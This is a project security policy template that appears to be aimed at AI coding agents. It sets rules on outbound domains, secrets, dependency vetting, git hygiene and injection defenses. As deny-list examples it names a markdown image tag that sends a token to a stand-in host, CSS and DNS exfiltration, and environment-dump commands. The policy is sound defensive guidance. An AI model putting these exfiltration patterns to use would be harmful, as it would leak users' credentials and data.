# Extreme Security Policy & Data Exfiltration Defense

## Principle
Every external dependency, environment variable, user input, and outbound network request is an active attack and exfiltration vector. Security evaluation in this project is **adversarial, zero-trust, and non-negotiable**.

---

## 1. Zero-Trust Egress & Exfiltration Control

Any unauthorized transmission of data outside the local runtime is classified as **Data Exfiltration** and will result in an immediate review veto.

- **Explicit Domain Whitelist**:
  - The application may ONLY make outbound HTTP/WebSocket/TCP requests to domains explicitly listed in the whitelist below.
  - Zero outbound connections to unlisted endpoints.
- **Stealth Exfiltration Channels (Strictly Banned)**:
  - **No Markdown Image Leaks**: Dynamic image tags (e.g. `![leak](https://external.com?token=...)`) in logs, artifacts, UI, or rendered views.
  - **No CSS Exfiltration**: External `url(...)` triggers in dynamically generated styles.
  - **No DNS Lookups**: Lookups to external nameservers with embedded data payloads.
  - **No Hidden Telemetry**: No tracking SDKs (Google Analytics, Sentry, Mixpanel, Datadog) unless explicitly requested and configured.
- **Approved Outbound Domains Whitelist**:
  ```
  # Add approved external domains here. If empty, NO outbound calls allowed:
  - localhost
  - 127.0.0.1
  # Example: api.github.com
  ```

---

## 2. Secrets Management & Environment Isolation

- **Zero Hardcoded Secrets**:
  - Zero tolerance for API keys, tokens, passwords, private keys, or credentials committed to the codebase.
  - All credentials must be loaded at runtime from environment variables.
- **Memory & Log Hygiene**:
  - **Ban on Full Environment Dumps**: Never run `console.log(process.env)`, `print(os.environ)`, `printenv`, or serialize environment dictionaries to logs or API responses.
  - **Error Masking**: Never return raw database errors, query dumps, or runtime stack traces in user-facing HTTP responses or CLI stdout.
- **Progress Artifact Sanitization**:
  - Agents write reports to `progress/*.md`. These reports **must never** contain real tokens, secrets, session cookies, or authorization headers.
  - Always use redacted placeholders (e.g., `Bearer sk_live_***REDACTED***`).

---

## 3. Supply Chain Security & Hallucination Defense

AI coding agents are vulnerable to **Package Hallucination / Slopsquatting** (generating fictitious package names that attackers register with malicious code).

- **Dependency Addition Protocol**:
  1. Prefer standard library (`stdlib`) whenever possible.
  2. Before adding ANY third-party dependency:
     - Verify the package name exists in official registries (`npm`, `PyPI`, `crates.io`).
     - Check package age (> 6 months) and download popularity.
     - Never install typo-squatted variants.
  3. Every dependency must have its version pinned in `package.json`, `requirements.txt`, or equivalent.
  4. Lockfiles (`package-lock.json`, `pnpm-lock.yaml`, `poetry.lock`) must be committed and verified.
  5. Prohibit unverified `postinstall` lifecycle scripts in dependencies (`--ignore-scripts` where appropriate).

---

## 4. Git & Repository Safety

- **Required `.gitignore` Coverage**:
  - Environment: `*.env`, `.env.*`, `.env.local`, `.env.production`
  - Certificates & Keys: `*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.crt`, `*.cert`
  - Databases: `*.db`, `*.sqlite`, `*.sqlite3`, `*.rdb`
  - Large Binaries: No files > 500KB committed to git.
  - Build & Caches: `node_modules/`, `__pycache__/`, `.venv/`, `dist/`, `build/`, `coverage/`
- **Pre-Commit Enforcement**:
  - Git pre-commit hook automatically scans all staged changes for secret patterns and blocks commit on match.
  - Never bypass the hook with `git commit --no-verify`.

---

## 5. Input Validation & Injection Defenses

- **SQL / NoSQL Injection**:
  - Parameterized queries / ORM methods ONLY. String concatenation in SQL statements is an immediate blocker.
- **Command Injection**:
  - Avoid `subprocess(shell=True)`, `child_process.exec()`, or dynamic shell execution.
  - Use array-based argument passing (`subprocess.run(["cmd", arg])`).
- **Dynamic Code Execution**:
  - `eval()`, `exec()`, `Function()`, and unsafe deserialization (`pickle.loads()`, `yaml.load()` without SafeLoader) are strictly prohibited.
- **Path Traversal**:
  - All file path inputs must be resolved and validated against an allowed base directory using `os.path.abspath` or `pathlib.Path.resolve()`.

---

## 6. Project-Specific Security Rules

{{ADD PROJECT-SPECIFIC SECURITY RULES HERE — e.g., OAuth scopes, JWT validation algorithms, CORS origins}}
